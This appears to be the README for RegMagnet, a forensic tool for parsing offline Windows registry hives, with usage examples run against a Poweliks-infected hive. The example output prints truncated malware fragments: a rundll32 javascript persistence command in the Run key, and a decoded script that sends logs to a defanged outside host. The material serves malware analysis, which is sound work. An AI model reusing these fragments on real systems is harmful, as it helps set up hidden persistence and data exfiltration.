# RegMagnet 0.0.0.3 [BETA]

* [Introduction](#introduction)
* [Requirements](#minimum-requirements)
* [Install](#install)
* [Update](#update)
* [Usage](#usage)
    - [Hive information](#hive-info)
    - [Query keys](#query-keys)
    - [Format fields](#format-fields)
    - [Output format](#output-format)
    - [Key information](#key-info)
    - [Query keys (Recursively)](#query-keys-r)
    - [Query values](#query-values)
    - [Registry Handlers](#registry-handlers)
    - [Plugins](#plugins-main)
    - [Baseline\/Whitelist](#baseline-main)
* [Code Usage](#code-usage)   
    - [Calling Functions](#code-usage-functions) 


## Introduction: <a name="introduction"></a>

RegMagnet (rm) is a python wrapper script for offline registry framework like:
* python-registry (@williballenthin) [Default registry provider]
* yarp (@msuhanov) [Support for registry permissions related searches]

This command-line utility is designed to slightly extend and facilitate framework’s capabilities. I wrote it once to improve my older regparser script.
In general it is used to parse any offline windows registry hives during malware hunting or forensic investigations.

**--> The right documentation yet to come (When time allows) <--**

It comes with following major features: 

* Search for a registry key, value name or value data patterns described by a comma separated: strings, regex strings or utf8 hex binary strings
* Search for value data by its size, specified by operators like range, equality or inequality
* Search for registry modified keys at given date and time, specified by regex string pattern or range, or inequality operators 
* Query the registry keys or values (including partial wildcard support)
* Enumerate and display hidden keys and values
* Supports searching by registry permissions (Key owner etc.) [Experimental - Not finished yet]
* Hash registry value content
* Detect hive type
* Export results to .REG format (Simplifies malware analysis/infection reproduction based on file-less registry load points)
* Export results to SQLite (Used by regmagnet for plugin’s baseline)
* Export results to CSV or stout
* Export results to JSON (str(dict))
* Customize output data (21+ different format fields)
* Easy plugin implementation and support with built in plugins like "autoruns", "services", "apt", "macro", "search", "parser", ...
* Improved Plugins baseline support 

Note: More details in **README.pdf**

## Minimum Requirements:  <a name="minimum-requirements"></a>

* Python 3.7 Framework
* Dependencies from requirements.txt
* Operating system:  Windows, Linux, MacOS, Cygwin

## Install: <a name="install"></a>
<pre>
mkdir /tools  # Adjust the path as required 
mkdir /venvs  # Adjust the path as required 
cd /venvs
pip install virtualenv # More info here: https://docs.python-guide.org/dev/virtualenvs/
virtualenv -p /usr/bin/python3.X regmagnet  # Adjust python version. (3.7+ required)
cd /tools
git clone https://github.com/wit0k/regmagnet.git
cd regmagnet
source /venvs/regmagnet/bin/activate
pip install -U pip
pip install -U setuptools
pip install -r requirements.txt 
</pre>

In proxy enabled environment: 
<pre>
pip --proxy http://PROXY_IP:PORT install -U pip
pip --proxy http://PROXY_IP:PORT install -U -r requirements.txt
</pre>
<pre>
REMARK: Regarding git configuration: 

To add proxy support: 
    git config --global http.proxy http://proxyUsername:proxyPassword@proxy.server.com:port
    git config --global http.proxy http://proxy.server.com:port

To remove proxy support: 
    git config --global --unset http.proxy
</pre>

## Update: <a name="update"></a>
<pre>
cd /tools/regmagnet
git pull
</pre>

## Usage: <a name="usage"></a>

Following code example covers the usage of <b>regmagnet</b> parameters.

### Hive information: <a name="hive-info"></a>

Print information about given hive and its direct sub-keys:
<pre>
-s "examples/poweliks.dat" -p "parser -hi"
</pre>
Result:
<pre>
Mapping: HKEY_CURRENT_USER
Root Key: $$$PROTO.HIV
Hive: examples/poweliks.dat
Hive type: NTUSER
Subkeys: 
     [*] $$$PROTO.HIV:
     [+] AppEvents
     [+] Console
     [+] Control Panel
     [+] Environment
     [+] Identities
     [+] Keyboard Layout
     [+] Network
     [+] Printers
     [+] Software
     [+] UNICODE Program Groups
</pre>

### Query keys: <a name="query-keys"></a>

Query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
* Both queries produce the same result, since -f csv is enabled by default
<pre>
-s "examples/poweliks.dat" -p "parser -qk Software\Microsoft\Windows\CurrentVersion\Run"
-s "examples/poweliks.dat" -f csv -p "parser -qk Software\Microsoft\Windows\CurrentVersion\Run"
</pre>
Result:
* [...] means that i have removed the value content manually to improve readability [The content was very long]
<pre>
[+] Loading Registry Provider: python_registry
[+] Parsing script arguments
[+] Loading Plugin Manager
[+] Searching for input files
[+] Parsing input hives
[+] Loading Plugin: parser
[+] Executing plugins ...
[+] Printing CSV formatted data
parser,HKEY_CURRENT_USER,2014-09-04 13:12:25.703125,1,4,S-1-5-21-606747145-117609710-1801674531-500,Software\Microsoft\Windows\CurrentVersion\Run,fbdfabbccabsacfsfdsf,"C:\Documents and Settings\All Users\Application Data\fbdfabbccabsacfsfdsf.exe"
parser,HKEY_CURRENT_USER,2014-09-04 13:12:25.703125,1,4,S-1-5-21-606747145-117609710-1801674531-500,Software\Microsoft\Windows\CurrentVersion\Run, a,rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write("\74script language=jscript.encode>" [...]
parser,HKEY_CURRENT_USER,2014-09-04 13:12:25.703125,1,4,S-1-5-21-606747145-117609710-1801674531-500,Software\Microsoft\Windows\CurrentVersion\Run,(default),#@~^ZXgAAA==W!x^DkKx [...] snAA==^#~@
parser,HKEY_CURRENT_USER,2014-09-04 13:12:25.703125,1,4,S-1-5-21-606747145-117609710-1801674531-500,Software\Microsoft\Windows\CurrentVersion\Run,ctfmon.exe,C:\WINDOWS\system32\ctfmon.exe
</pre>

### Format fields: <a name="format-fields"></a>

You can control the output through format fields.
Entire list of all format fields can be summoned with:  -s "examples/poweliks.dat" -pff
<pre>
 [+] plugin_name
 [+] hive
 [+] key
 [+] values
 [+] hive_header
 [+] hive_file_path
 [+] hive_file_name
 [+] hive_obj
 [+] hive_root
 [+] hive_type
 [+] hive_size
 [+] hive_md5
 [+] hive_user
 [+] hive_mapping
 [+] key_path
 [+] key_path_unicode
 [+] key_timestamp
 [+] key_subkey_count
 [+] key_value_count
 [+] key_owner
 [+] key_group
 [+] key_permissions
 [+] key_sddl
 [+] value_path
 [+] value_name
 [+] value_name_unicode
 [+] value_type
 [+] value_type_str
 [+] value_content
 [+] value_content_str
 [+] value_content_unicode
 [+] value_size
 [+] value_raw_data
</pre>

So let's say you want to display registry value name (value_name) and it's data (value_content):
<pre>
-s "examples/poweliks.dat" -ff "value_name,value_content" -p "parser -qk Software\Microsoft\Windows\CurrentVersion\Run"
</pre>
Result:
<pre>
fbdfabbccabsacfsfdsf,"C:\Documents and Settings\All Users\Application Data\fbdfabbccabsacfsfdsf.exe"
 a,rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write("\74script language=jscript.encode>" [...]
(default),#@~^ZXgAAA==W!x^DkKx [...] snAA==^#~@
ctfmon.exe,C:\WINDOWS\system32\ctfmon.exe
</pre>

### Output Format: <a name="output-format"></a>
Supported output formats: json,csv,tab,winreg,sqlite
* Of course if you choose sqlite, it would print csv instead, but if specified with option -o, it would save the output to SQLite database
* If winreg is specified, it would print in Windows Registry format (So the output can be imported in Windows Registry)
<pre>
-s "examples/poweliks.dat" -ff "value_name,value_content" -f tab -p "parser -qk Software\Microsoft\Windows\CurrentVersion\Run"
</pre>
Result:
<pre>
fbdfabbccabsacfsfdsf  "C:\Documents and Settings\All Users\Application Data\fbdfabbccabsacfsfdsf.exe"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
 a                    rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write("\74script language=jscript.encode>" [...]
(default)             #@~^ZXgAAA==W!x^DkKx [...] snAA==^#~@
ctfmon.exe            C:\WINDOWS\system32\ctfmon.exe

or with "-f winreg -o run.reg" (The content of run.reg):

Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
"fbdfabbccabsacfsfdsf"=""C:\Documents and Settings\All Users\Application Data\fbdfabbccabsacfsfdsf.exe""
"\x00a"="rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write("\74script language=jscript.encode>" [...]"
"(default)"="#@~^ZXgAAA==W!x^DkKx [...] snAA==^#~@"
"ctfmon.exe"="C:\WINDOWS\system32\ctfmon.exe"    
</pre>

### Key Information: <a name="key-info"></a>

<pre>
-s "examples/poweliks.dat" -p "parser -ki Software\Microsoft\Windows\CurrentVersion\Run"
</pre>
Result:
<pre>
Mapping: HKEY_CURRENT_USER
Root Key: Software\Microsoft\Windows\CurrentVersion\Run
Hive: examples/poweliks.dat
Hive type: NTUSER
Subkeys: 
 [*] Software\Microsoft\Windows\CurrentVersion\Run:
     [+]  
</pre>

### Query Keys (Recursively): <a name="query-keys-r"></a>

Let's use again format fields to get some more details:
<pre>
-s "examples/poweliks.dat" -ff "key_subkey_count,key_value_count,key_path,key_path_unicode" -f tab -p "parser -qkw Software\Microsoft\Windows\CurrentVersion\Run\*"
</pre>
Result:
<pre>
1  4  Software\Microsoft\Windows\CurrentVersion\Run                 b'[...]\x00\\\x00R\x00u\x00n\x00'                                
1  4  Software\Microsoft\Windows\CurrentVersion\Run                 b'[...]\x00\\\x00R\x00u\x00n\x00'                                
1  4  Software\Microsoft\Windows\CurrentVersion\Run                 b'[...]\x00\\\x00R\x00u\x00n\x00'                                
1  4  Software\Microsoft\Windows\CurrentVersion\Run                 b'[...]\x00\\\x00R\x00u\x00n\x00'                                
0  0  Software\Microsoft\Windows\CurrentVersion\Run\\x00\x01\x01    b'[...]\x00\\\x00R\x00u\x00n\x00\\\x00\x01\x00\x00\x00\x01\x00'

--> First 4 entries from the same key, claim that there are 4 values (which is indeed True) and that there is 1 subkey ...
  ---> The subkey is hidden, since its name starts with a null byte and is followed by non-printable characters 
    ----> In hidden subkeys there are 0 subkeys and 0 values (So empty hidden key)  

--> -qkw: allows for wildcard querying, so i was able to make \Run\* to indicate to scan the \Run and its subkeys
</pre>

### Query Values: <a name="query-values"></a>

Let's say you want to query default registry value in the Run key, and get its value_name and value_content only.
<pre>
-s "examples/poweliks.dat" -ff "value_name,value_content" -f json -p "parser -qv Software\Microsoft\Windows\CurrentVersion\Run\(default)"
</pre>
Result:
<pre>
{'value_name': '(default)', 'value_content': '#@~^ZXgAAA==W!x^DkKx [...] snAA==^#~@'}
</pre>

### Registry Handlers: <a name="registry-handlers"></a>
Let's say you want to query the same value, and try to decode the value_content as it seems to be VBE encoding.
<pre>
-s "examples/poweliks.dat" -rh "decode_vbe" -ff "value_name,value_content" -f json -p "parser -qv Software\Microsoft\Windows\CurrentVersion\Run\(default)"
or
-s "examples/poweliks.dat" -rh "decode_vbe&lt;field&gt;value_content" -ff "value_name,value_content" -f json -p "parser -qv Software\Microsoft\Windows\CurrentVersion\Run\(default)"
or 
-s "examples/poweliks.dat" -rh "decode_vbe&lt;field&gt;value_content&lt;rfield&gt;value_content" -ff "value_name,value_content" -f json -p "parser -qv Software\Microsoft\Windows\CurrentVersion\Run\(default)"
--> They are all the same (value_content is default field name)
</pre>
Result:
<pre>
{'value_name': '(default)', 'value_content': 'function log(l){try{x=new ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","hxxp://faebd7[.]com [...]'}
</pre>
If you wonder how to display all available registry handlers, use following command:
<pre>
-s "examples/poweliks.dat" -prh
</pre>
Example output:
<pre>
Registry Handlers:
 [+] decrypt_teamviewer - aes_cbc() -> Decrypt data with aes-cbc ... beta
 [+] dump_to_file - dump_to_file() -> Saves the input data buffer to a file specified by a parameter
 [+] decompress_gzip - decompress_gzip() -> Attempts to un-gzip the input data
 [+] decrypt_rc4 - decrypt_rc4(Key) -> Decrypts the input data with a string key specified
 [+] sxor - sxor(Key) -> XOR the input data with a string key specified
 [+] str - str() -> Converts the input data to String
 [+] shexdump - str2hex(input_data) -> Converts the input data to HexDump string format
 [+] unescape_url - unescape_url -> Unescapes the input data string/url
 [+] cit_dump - cit_dump() -> Dumps the unicode string and converts it to human readable format (Used for strings originating from cit plugin)
 [+] utf8_dump - utf8_dump() -> Dumps the unicode string and converts it to human readable format
 [+] rslice - slice(start) -> Slice the input data [Range: start:]
 [+] slice - slice(0, stop) -> Slice the input data [Range: 0:stop]
 [+] b64_dump - Dump and decode base64 strings from the input data
 [+] b64_decode - Decode the input data as base64 string
 [+] b64_encode - Encode the input data to base64 string
 [+] decode_vbe - Attempts to VBE decrypt the input data
 [+] nothing - Do nothing, reserved for plugin developers...(Mainly used when only custom handler is required)
 [+] entropy - entropy() -> Calculates the entropy of the input data
</pre>

The registry handlers can be chained, like the ones from CyberChef.
* Let's say you want to get the same data as before, but this time, dump the value_content to a file.
<pre>
-s "examples/poweliks.dat" -rh "decode_vbe,dump_to_file<param>/tmp/script.vbe" -ff "value_name,value_content" -p "parser -qv Software\Microsoft\Windows\CurrentVersion\Run\(default)"
</pre>
Result:
<pre>
cat /tmp/script.vbe | head -c 120

function log(l){try{x=new ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","hxxp://faebd7[.]com/log?log="+l,false);x
</pre>

### Plugins: <a name="plugins-main></a>

<pre>
-s "examples/poweliks.dat" -p "plugin_name < plugin_params >,plugin_name < plugin_params >"
</pre>

Following command would execute all specified plugins against all loaded hives:
<pre>
-p "autoruns,office"
</pre>


## Baseline: <a name="baseline-main"></a>
It's still in beta version (a feature from regparser, with low attention rate, but i still think that it's usefull)

* Create a baseline file (Whitelisted entries) on vanilla-clean machine: 
  <pre>-s "/hives/baseline/clean" -o baseline/autoruns.bl -f sqlite -p "autoruns"</pre>

* Only the items NOT present in the autoruns.bl will be printed 
  <pre>
  -s "/hives/offline_reg_file" -p "autoruns -b"
  Note: -b force the plugin to load a baseline file (default: baseline/%name_of_plugin.bl%)
  </pre>

## Code Usage: <a name="code-usage"></a>

## Functions: <a name="code-usage-functions"></a>
RegMagnet functions can be called via **exec_action** which accepts a function name and parameters:
<pre>
items = []
items = parser.exec_action(action_name='query_key', parameters=(parser, r'Microsoft\Windows\CurrentVersion\Run', _hive_file))
</pre>

Similarly all functions can be triggered directly by the registry_parser object (in traditional way):
<pre>
items = []
items = items = parser.query_key(r'Microsoft\Windows\CurrentVersion\Run', _hive_file)
</pre>

Currently following functions are exposed by a string:

<pre>actions = {
        'python-registry': {
            'query_key_wd': query_key_wd,
            'query_key': query_key,
            'query_key_recursive': query_key_recursive,
            'query_value': query_value,
            'query_value_wd': query_value_wd,
            'hive_info': hive_info,
            'key_info': key_info,
            'export': export,
            'print': print
        }
    }
</pre>

**Format fields:**

Plugins can dynamically add new format fields(upon startup) to following objects: registry_hive, registry_key and registry_value respectively, by calling following parser function:

*Note*: IF you specify the same field_name for all obj_names, only the field for obj_name="value" would be taken into account upon creation of registry_item object. 

<pre>
parser.add_format_field(obj_name='hive', field_name='hive_hostname')
parser.add_format_field(obj_name='key', field_name='key_hidden')
parser.add_format_field(obj_name='value', field_name='comments')
</pre>

**Registry Handlers:**

<pre>
Convert registry value name and value content to base64:

    reg_handler = parser.reg.registry_reg_handler(recipes=['b64_encode&lt;field&gt;value_content,value_name'])
    items.extend(parser.query_value(value_path=r'Microsoft\Windows\CurrentVersion\Run\RTHDVCPL', hive=_hive_file, reg_handler=reg_handler))

Encrypt registry value content with a XOR key and encode it to base64:

    reg_handler = parser.reg.registry_reg_handler(recipes=['sxor&lt;param&gt;XORkey&lt;field&gt;value_content', 'b64_encode'])
    items.extend(parser.query_value(value_path=r'Microsoft\Windows\CurrentVersion\Run\RTHDVCPL', hive=_hive_file, reg_handler=reg_handler))   
</pre>

**Command-line parameters:**
 
 <pre>
* Print script params: -h
* Print plugin specific params:
     -s "/hives/offline_reg_file" -p "parser -h"
     -s "/hives/offline_reg_file" -p "search -h"
     etc.
 </pre>
 
 Script parameters:
 <pre>
RegMagnet - Working with Microsoft Offline Registry Hives

optional arguments:
  -h, --help            show this help message and exit

Script arguments:

  -rp DEFAULT_REGISTRY_PROVIDER, --registry-provider DEFAULT_REGISTRY_PROVIDER
                        Specify the default registry provider to load
                        (Default: -rp "python_registry")
  -v, --verbose         Enables verbose logging
  -s INPUT_HIVES, --hives INPUT_HIVES
                        Registry hive fie or folder containing registry hives
  -r, --recursive       Recursively scan the input folder
  --disable-unzip       Skip supported archives
  -o OUTPUT_FILE, --output OUTPUT_FILE
                        Output file path
  -f OUTPUT_FORMAT, --output-format OUTPUT_FORMAT
                        Output format: "cs" | "tab" | "winreg" | "sqlite"
  -ff FIELDS_TO_PRINT, --output-fields FIELDS_TO_PRINT
                        Comma separated list of output format fields like: -ff
                        "value_path,value_content_str"
  -ffa EXTRA_FIELDS_TO_PRINT, --output-field-append EXTRA_FIELDS_TO_PRINT
                        Append a format field to output format fields list
  -eek, --output-empty-keys
                        Exclude keys without values from the output
  -rh REGISTRY_HANDLERS, --registry-handler REGISTRY_HANDLERS
                        Registry handler string: "handler_name&lt;field&gt;input_fie
                        ld&lt;param&gt;param_n&lt;rfield&gt;result_field" like -rh
                        "b64_encode&lt;field&gt;value_name;value_content" [Note:
                        Input fields and params must be ; separated]
  -rhdp RH_DECODE_PARAM, --registry-handler-decode-param RH_DECODE_PARAM
                        Allow to specify the handler parameters in any of
                        supported encodings: "base64"
  -p PLUGINS_TO_EXECUTE [PLUGINS_TO_EXECUTE ...], --plugins PLUGINS_TO_EXECUTE [PLUGINS_TO_EXECUTE ...]
                        The list of comma separated plugins to execute with
                        thier params like: -p "autoruns,macro,plugin_name"
  -pff, --print-format-fields
                        Print available output format fields
  -prh, --print-registry-handlers
                        Print available registry handlers
 </pre>
 
#### TO DO:
* Continue working on security_descriptor, to obtain the key_sddl field 
* Make sure that regex, cannot be used in conjunction with *
* Use the list of registry_item objects to create winreg data and sqlite data (instead of a list of dicts, coming from registry_item.items())
* Add json output format
